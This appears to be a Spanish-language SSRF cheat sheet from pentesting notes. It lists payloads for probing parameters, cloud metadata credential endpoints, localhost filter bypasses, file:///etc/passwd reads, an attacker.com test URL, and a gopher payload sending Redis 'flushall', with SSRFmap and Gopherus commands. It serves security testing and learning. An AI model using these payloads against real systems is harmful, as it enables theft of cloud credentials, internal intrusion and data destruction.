---
tags: [web, ssrf]
status: done
---

# SSRF — Server-Side Request Forgery

---

## Concepto

El servidor hace una petición HTTP **controlada por el atacante** → acceso a recursos internos, metadata cloud, servicios no expuestos.

---

## Detección

```
# Buscar parámetros que reciban URLs o rutas
url=, redirect=, next=, path=, dest=, uri=, load=, fetch=, src=, file=

# Payloads de detección (usar Burp Collaborator o interactsh)
https://attacker.com/ssrf_test
http://169.254.169.254/        # AWS metadata
http://metadata.google.internal/
http://127.0.0.1/
http://localhost/
```

---

## Targets Internos

```bash
# AWS IMDSv1 (sin token → read directo)
http://169.254.169.254/latest/meta-data/
http://169.254.169.254/latest/meta-data/iam/security-credentials/
http://169.254.169.254/latest/user-data/

# GCP
http://metadata.google.internal/computeMetadata/v1/
# Requiere: Metadata-Flavor: Google

# Azure
http://169.254.169.254/metadata/instance?api-version=2021-02-01
# Requiere: Metadata: true

# Servicios internos típicos
http://127.0.0.1:8080/admin
http://127.0.0.1:6379/       # Redis
http://127.0.0.1:9200/       # Elasticsearch
http://127.0.0.1:2375/       # Docker API
http://10.0.0.x/             # Red interna
```

---

## Bypass de Filtros

```bash
# Filtran "127.0.0.1" → alternativas
http://0/
http://0.0.0.0/
http://localhost/
http://[::1]/               # IPv6
http://127.1/               # Forma corta
http://2130706433/          # Decimal: 127.0.0.1
http://0x7f000001/          # Hex

# Filtran "http://" → data/file schemes (según soporte)
file:///etc/passwd
dict://127.0.0.1:6379/info
ftp://127.0.0.1/

# DNS rebinding / redirect
# Alojar en tu servidor: primero resuelve a algo permitido, luego a 127.0.0.1
# Herramienta: rebinder.github.io

# Redirección abierta + SSRF
url=https://trusted.com/redirect?to=http://169.254.169.254/
```

---

## SSRF Blind

```bash
# No hay respuesta visible → usar out-of-band
# Burp Collaborator / interactsh

# Payload con Collaborator
url=http://tu-collaborator.burpcollaborator.net/ssrf

# interactsh
url=http://tu-id.interact.sh/

# Si llega petición DNS o HTTP → SSRF confirmado (aunque respuesta sea vacía)
```

---

## SSRF → RCE (Redis)

```
# Si Redis en 127.0.0.1:6379 sin auth
# Via Gopher protocol:
url=gopher://127.0.0.1:6379/_%2A1%0D%0A%248%0D%0Aflushall%0D%0A...

# Herramienta: Gopherus — genera payloads Gopher para Redis, MySQL, etc.
python3 gopherus.py --exploit redis
```

---

## Herramientas

```bash
# SSRFmap — automatiza SSRF
python3 ssrfmap.py -r request.txt -p url --module readfiles

# Interactsh para SSRF blind
interactsh-client

# ffuf para descubrir parámetros SSRF
ffuf -u "https://target.com/fetch?FUZZ=http://169.254.169.254/" -w params.txt
```

